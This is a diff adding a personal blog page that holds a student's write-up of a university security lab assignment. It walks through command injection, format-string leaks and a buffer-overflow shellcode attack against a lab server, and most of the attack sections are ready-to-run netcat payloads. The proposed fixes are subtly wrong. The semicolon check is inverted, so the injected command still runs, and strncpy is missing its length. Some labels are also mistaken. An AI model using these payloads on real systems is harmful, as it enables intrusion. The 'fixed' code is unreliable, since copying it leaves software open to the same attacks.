@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rdweirdo981.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+<meta name="description" content="Notes about cybersecurity, mathematics, and anything else.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Random Weirdo">
+<meta property="og:url" content="https://rdweirdo981.github.io/page/3/index.html">
+<meta property="og:site_name" content="Random Weirdo">
+<meta property="og:description" content="Notes about cybersecurity, mathematics, and anything else.">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Daisy">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rdweirdo981.github.io/page/3/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+<title>Random Weirdo</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Random Weirdo</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">It from bit.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Daisy"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Daisy</p>
+  <div class="site-description" itemprop="description">Notes about cybersecurity, mathematics, and anything else.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Daisy">
+      <meta itemprop="description" content="Notes about cybersecurity, mathematics, and anything else.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Random Weirdo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/" class="post-title-link" itemprop="url">FIT5003 Assignment 1 - BOF, FSV, and Android & Java Security</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-20 21:28:15" itemprop="dateCreated datePublished" datetime="2021-01-20T21:28:15+08:00">2021-01-20</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-01-22 16:21:13" itemprop="dateModified" datetime="2021-01-22T16:21:13+08:00">2021-01-22</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Master-of-Cybersecurity/" itemprop="url" rel="index"><span itemprop="name">Master of Cybersecurity</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Master-of-Cybersecurity/FIT5003/" itemprop="url" rel="index"><span itemprop="name">FIT5003</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <center> This report is related to FIT5003 2020S2 Assignment 1. The main aspects that this assignment reviews are Buffer Overflow, Format String Vulnerability, and Android &amp; Java Security.</center>
+
+<br>
+
+<h1 id="Assignment-Requirements"><a href="#Assignment-Requirements" class="headerlink" title="Assignment Requirements"></a>Assignment Requirements</h1><p>You can find it in: <a target="_blank" rel="noopener" href="https://github.com/RdWeirdo981/Master-of-Cybersecurity">https://github.com/RdWeirdo981/Master-of-Cybersecurity</a></p>
+<h1 id="Task1-1-Program-version-1"><a href="#Task1-1-Program-version-1" class="headerlink" title="Task1.1 Program version: 1"></a><strong>Task1.1</strong> Program version: 1</h1><h2 id="a-Vulnerability"><a href="#a-Vulnerability" class="headerlink" title="a) Vulnerability"></a>a) Vulnerability</h2><p>By copying the code in <code>listing-1</code> into a c file and using RAT provided in week 7 lab, I find that in these lines there are vulnerabilities:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Line</strong></th>
+<th><strong>Vulnerability</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>char  command[300];    char  buf[1500];</code></td>
+<td>fixed  size local buffer.</td>
+</tr>
+<tr>
+<td><code>sprintf(command,  "/usr/bin/nslookup %s", buf);</code></td>
+<td>Format string vulnerability</td>
+</tr>
+<tr>
+<td><strong><em><code>system(command);</code></em></strong></td>
+<td><strong><em>Command  injection</em></strong></td>
+</tr>
+</tbody></table>
+<p>However, we must analyze these vulnerabilities to see if they can be used to attack. I originally generate a BOF and a FSV attack to the host server, but the stack crashing is detected, then server terminates. So, I have to try the last one: command injection. Thankfully, the input is directly called by the system.  Thus, I can use the 2nd argument to execute my command.</p>
+<h2 id="b-Exploit"><a href="#b-Exploit" class="headerlink" title="b) Exploit"></a>b) Exploit</h2><p>Problem version 3: change the privilege level to read, write and execute for all files in the folder</p>
+<p>Command injection: </p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"hackthebox.com; chmod a=rwx ~/hidden"</span> | nc 10.0.2.14 7070</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Result:</p>
+<p><img src="1.jpg"></p>
+<h2 id="c-Fixing-the-vulnerability"><a href="#c-Fixing-the-vulnerability" class="headerlink" title="c) Fixing the vulnerability"></a>c) Fixing the vulnerability</h2><p>Reference: </p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a> </p>
+<p><a target="_blank" rel="noopener" href="http://www.cplusplus.com/reference/cstring/strchr/">http://www.cplusplus.com/reference/cstring/strchr/</a> </p>
+<p>Since we use “;” to be the header of the 2nd command thus to attack, we can counter this attack by a validation check. We’ll use <code>strchr()</code> to check if there’s another command that is sent to the server.</p>
+<p>We shall change the <code>sprintf()</code> to <code>system(command)</code> as below:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="built_in">sprintf</span>(command, <span class="string">"/usr/bin/nslookup %s"</span>, buf);  </span><br><span class="line"><span class="number">2.</span>	  <span class="comment">// validation check  </span></span><br><span class="line"><span class="number">3.</span>	  <span class="keyword">int</span> is_cmd = <span class="built_in">strchr</span>(command, <span class="string">';'</span>);  </span><br><span class="line"><span class="number">4.</span>	  <span class="comment">// if thers is a ";", strchr will return NULL  </span></span><br><span class="line"><span class="number">5.</span>	  <span class="comment">// another method: compare to see if command is nslookup  </span></span><br><span class="line"><span class="number">6.</span>	  <span class="comment">// int is_cmd = strncmp("/usr/bin/nslookup", command, 17);  </span></span><br><span class="line"><span class="number">7.</span>	  <span class="keyword">if</span> (is_cmd != <span class="literal">NULL</span>) {  </span><br><span class="line"><span class="number">8.</span>	    system(command);  </span><br><span class="line"><span class="number">9.</span>	  } <span class="keyword">else</span> {  </span><br><span class="line"><span class="number">10.</span>	    <span class="built_in">printf</span>(<span class="string">"Invalid Input!"</span>);  </span><br><span class="line"><span class="number">11.</span>	  }</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Task1-2-Server-ver3-amp-port-6063"><a href="#Task1-2-Server-ver3-amp-port-6063" class="headerlink" title="Task1.2 Server ver3 &amp; port 6063"></a><strong>Task1.2</strong> Server ver3 &amp; port 6063</h1><h2 id="a-Reverse-shell"><a href="#a-Reverse-shell" class="headerlink" title="a) Reverse shell"></a>a) Reverse shell</h2><p>Vulnerability:</p>
+<p>i)   Format string vulnerability in <code>myprintf()</code>;</p>
+<p>ii)  BOF in <code>char password_buffer[BUF_SIZE]</code>; <code>strcpy(password_buffer, password)</code>;</p>
+<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>Echo to server will call <code>check_authentication(char * username, char * password)</code>, username will accept <code>myprintf()</code>. We use FSV in <code>myprintf()</code>.</p>
+<p>This requires lots of attempts, but finally we got:</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x7, "%s"') pw123 | nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="2.jpg"></p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x8, "%s"') pw123 | nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="3.jpg"></p>
+<p>The password_buffer address is at 8th position.</p>
+<p>We do not need 0xbfffc80 because this address will change when we change password.</p>
+<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>Use BOF in <code>strcpy()</code>;</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 123 $(perl -e 'print "A"x119') | nc 10.0.2.14 6063</span><br><span class="line">echo 123 $(perl -e 'print "A"x120') | nc 10.0.2.14 6063</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Compare these two. If 119 change to 120, the <code>check_authentication()</code> will crash and not respond. So, the buffer size then is 119.</p>
+<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>BOF the shellcode</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x8') $(perl -e 'print "A"x119')| nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="4.jpg"></p>
+<p>The last buffer address is 0xbfffc10. We now can use this to do BOF attack.</p>
+<p>Ref: What’s a reverse shell <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/">https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/</a> </p>
+<p>Although the tutor said on Ed discussion that we should not use reverse shell in our tutorial, I found that the shellcode does useful. So, I use it to obtain the reverse shell.</p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(perl -e <span class="string">'print "%.8x."x8'</span>) $(perl -e <span class="string">'print "\x90"x40,"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80\x90","\x19\xfc\xff\xbf"x15'</span>)| nc 10.0.2.14 6063</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="5.jpg"></p>
+<h2 id="b-Getting-the-file"><a href="#b-Getting-the-file" class="headerlink" title="b) Getting the file"></a>b) Getting the file</h2><p>Ref: <a target="_blank" rel="noopener" href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a> </p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="subst">$(perl -e 'print <span class="string">"AAAA"</span>,<span class="string">"%.8x."</span>x170,<span class="string">"%s"</span>')</span> 123456"</span> |nc 10.0.2.14 6063</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="subst">$(perl -e 'print <span class="string">"AAAA"</span>,<span class="string">"%.8x."</span>x168,<span class="string">"%s"</span>')</span> 123456"</span> |nc 10.0.2.14 6063</span><br></pre></td></tr></tbody></table></figure>
+
+<p>The 1st one will return the password and the 2nd one will return authenticate3. </p>
+<p>But I don’t know what’s the next.</p>
+<h2 id="c-Fixing-the-vulnerability-1"><a href="#c-Fixing-the-vulnerability-1" class="headerlink" title="c) Fixing the vulnerability"></a>c) Fixing the vulnerability</h2><h3 id="i-Format-string-vulnerability"><a href="#i-Format-string-vulnerability" class="headerlink" title="i) Format string vulnerability"></a>i) Format string vulnerability</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> * msg)</span> </span>{  </span><br><span class="line"><span class="number">2.</span>	    <span class="keyword">char</span> dummy[DUMMY_SIZE];  </span><br><span class="line"><span class="number">3.</span>	    <span class="built_in">memset</span>(dummy, <span class="number">0</span>, DUMMY_SIZE);  </span><br><span class="line"><span class="number">4.</span>	    <span class="built_in">printf</span>(<span class="string">"%s"</span>,msg);    </span><br><span class="line"><span class="number">5.</span>	  }</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="ii-BOF"><a href="#ii-BOF" class="headerlink" title="ii) BOF"></a>ii) BOF</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="built_in">strncpy</span>(password_buffer, password);</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2.1"></a>Task 2.1</h1><p>I started this assignment too late and I have no experience with android program &amp; few experience with JAVA before, so I only work out a little part of it. The material in week 4 &amp; 5 lecture and week 5 &amp; 6 tutorial lab are useful, but I do not have enough time to implement them. </p>
+<p>Here the only functionality that I add to the project:</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//generates hash (uses SHA256)</span></span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    MessageDigest messageDigest = MessageDigest.getInstance(<span class="string">"SHA-256"</span>); <span class="comment">// String process_ks_pass</span></span><br><span class="line">    <span class="keyword">byte</span>[] hashByte = messageDigest.digest(process_ks_pass.getBytes()); <span class="comment">// String to byte</span></span><br><span class="line">    <span class="keyword">byte</span>[] hashByteFirstFive = extractbytes(hashByte, <span class="number">5</span>); <span class="comment">// choose the first 5 digits, still byte</span></span><br><span class="line">    keyStorePassword = encodeHexString(hashByteFirstFive).toCharArray();  <span class="comment">// byte to hexadecimal String to char[]</span></span><br><span class="line"></span><br><span class="line">} <span class="keyword">catch</span> (NoSuchAlgorithmException e) {</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h1><p>Ref: </p>
+<p>Week4 lecture</p>
+<p>[<a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unsafe_use_of_Reflection#:~:text=Description%20This%20vulnerability%20is%20caused%20by%20unsafe%20use,result%20in%20a%20limited%20form%20of%20code%20injection]">https://owasp.org/www-community/vulnerabilities/Unsafe_use_of_Reflection#:~:text=Description%20This%20vulnerability%20is%20caused%20by%20unsafe%20use,result%20in%20a%20limited%20form%20of%20code%20injection]</a>(<a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/Unsafe_use_of_Reflection#:~:text=Description">https://owasp.org/www-community/vulnerabilities/Unsafe_use_of_Reflection#:~:text=Description</a> This vulnerability is caused by unsafe use,result in a limited form of code injection). Unsafe use of Reflection</p>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/www-pdf-archive/GOD16-Deserialization.pdf">https://owasp.org/www-pdf-archive/GOD16-Deserialization.pdf</a> Java Deserialization A0acks</p>
+<p><strong>1) Java Deserialization</strong></p>
+<p>If we use <code>ObjectInputStream.readObject()</code>; there might have a JAVA deserialization problem. When we use the malicious data to be the input, the attack may happen.</p>
+<p><strong>2) Java Reflection</strong></p>
+<p>We can’t use <code>Class newClass = new Class()</code>, so we have to use <code>.getClass()</code>;. This is an example of Java Reflection. We can use Java Reflection to get metadata, which means that this can also be used by the attackers. We call the <code>setClass(input)</code> and give it a malicious input so the attack will happen. </p>
+<p>To defend it, we can use restrict permissions in security policy. </p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Daisy</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+</body>
+</html>
